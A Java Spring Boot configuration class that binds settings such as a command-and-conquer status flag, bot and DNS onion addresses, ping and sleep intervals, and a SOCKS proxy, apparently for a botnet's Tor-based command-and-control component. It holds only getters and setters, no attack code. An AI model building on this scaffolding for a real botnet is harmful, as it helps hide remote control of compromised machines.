package cs.sii.config.onLoad;

import org.springframework.boot.context.properties.ConfigurationProperties;
import org.springframework.context.annotation.Configuration;


@Configuration
@ConfigurationProperties(
		prefix = "config",
		locations = "classpath:config.properties",
		exceptionIfInvalid = true,
		ignoreInvalidFields = false, 
		ignoreUnknownFields = false
		)
public class Config {
	
		private boolean commandandconquerStatus;
		private int pingdelay;
		private int sleeptime;
		private String dnsonion;
		private String urirequest;
		private String botonion;
		private int requestTimeout;
		private int connectTimeout;
		private int	readTimeout;
		private String socksProxyHost;
		private String socksProxyPort;


		public boolean isCommandandconquerStatus() {
			return commandandconquerStatus;
		}
		public void setCommandandconquerStatus(boolean commandandconquerStatus) {
			this.commandandconquerStatus = commandandconquerStatus;
		}
		public int getPingdelay() {
			return pingdelay;
		}
		public void setPingdelay(int pingdelay) {
			this.pingdelay = pingdelay;
		}
		public int getSleeptime() {
			return sleeptime;
		}
		public void setSleeptime(int sleeptime) {
			this.sleeptime = sleeptime;
		}
		public String getUrirequest() {
			return urirequest;
		}
		public void setUrirequest(String urirequest) {
			this.urirequest = urirequest;
		}
		public int getRequestTimeout() {
			return requestTimeout;
		}
		public void setRequestTimeout(int requestTimeout) {
			this.requestTimeout = requestTimeout;
		}
		public int getConnectTimeout() {
			return connectTimeout;
		}
		public void setConnectTimeout(int connectTimeout) {
			this.connectTimeout = connectTimeout;
		}
		public int getReadTimeout() {
			return readTimeout;
		}
		public void setReadTimeout(int readTimeout) {
			this.readTimeout = readTimeout;
		}
	public String getDnsonion() {
		return dnsonion;
	}

	public void setDnsonion(String dnsonion) {
		this.dnsonion = dnsonion;
	}

	public String getBotonion() {
		return botonion;
	}

	public void setBotonion(String botonion) {
		this.botonion = botonion;
	}

	public String getSocksProxyHost() {
		return socksProxyHost;
	}

	public void setSocksProxyHost(String socksProxyHost) {
		this.socksProxyHost = socksProxyHost;
	}

	public String getSocksProxyPort() {
		return socksProxyPort;
	}

	public void setSocksProxyPort(String socksProxyPort) {
		this.socksProxyPort = socksProxyPort;
	}
}
